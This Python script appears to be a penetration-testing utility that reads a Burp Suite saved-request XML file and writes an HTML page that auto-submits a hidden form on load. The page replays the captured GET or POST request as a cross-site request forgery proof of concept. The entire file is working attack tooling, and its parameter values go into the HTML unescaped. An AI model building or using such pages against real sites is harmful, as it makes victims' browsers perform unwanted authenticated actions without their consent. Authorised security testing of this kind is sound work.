import argparse
import urllib.parse
import base64
import xml.etree.ElementTree as ET

# Function to parse Burp Suite saved request file
def parse_burp_request(file_path):
    tree = ET.parse(file_path)
    root = tree.getroot()

    # Find the first item element
    item = root.find('item')
    if item is None:
        raise ValueError("No request found in Burp request file")

    # Extract relevant fields from the XML
    method = item.find('method').text
    url = item.find('url').text
    request_element = item.find('request')
    if request_element is not None and request_element.attrib.get('base64') == 'true':
        body = base64.b64decode(request_element.text).decode('utf-8')
    else:
        body = request_element.text if request_element is not None else ""

    headers = {}
    for line in body.splitlines():
        if line == "" or ':' not in line:
            break
        header_key, header_value = line.split(':', 1)
        headers[header_key.strip()] = header_value.strip()

    # Extract parameters if method is POST
    body_content = "".join(body.split('\r\n\r\n')[1:]) if '\r\n\r\n' in body else ""
    params = body_content if method == 'POST' else urllib.parse.urlparse(url).query

    return url, params, method

# Main function to parse arguments and generate CSRF PoC
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Generate a CSRF PoC HTML file from Burp Suite saved request file')
    parser.add_argument('--burp_request', type=str, required=True, help='Path to the Burp Suite saved request file')
    
    args = parser.parse_args()

    # Parse Burp Suite request
    target_url, params, method = parse_burp_request(args.burp_request)

    # Generate the CSRF PoC HTML code
    params_dict = dict(urllib.parse.parse_qsl(params))
    form_inputs = "".join([f'<input type="hidden" name="{key}" value="{value}">' for key, value in params_dict.items()])
    
    if method.lower() == 'get':
        url_with_params = f"{target_url}?{params}"
        csrf_poc_html = f"""
        <html>
        <body onload="document.forms[0].submit()">
        <form action="{url_with_params}" method="GET">
        </form>
        </body>
        </html>
        """
    else:
        csrf_poc_html = f"""
        <html>
        <body onload="document.forms[0].submit()">
        <form action="{target_url}" method="POST">
        {form_inputs}
        </form>
        </body>
        </html>
        """

    # Write the generated HTML to a file
    with open('csrf_poc.html', 'w') as f:
        f.write(csrf_poc_html)

    print("CSRF PoC HTML file 'csrf_poc.html' has been generated.")
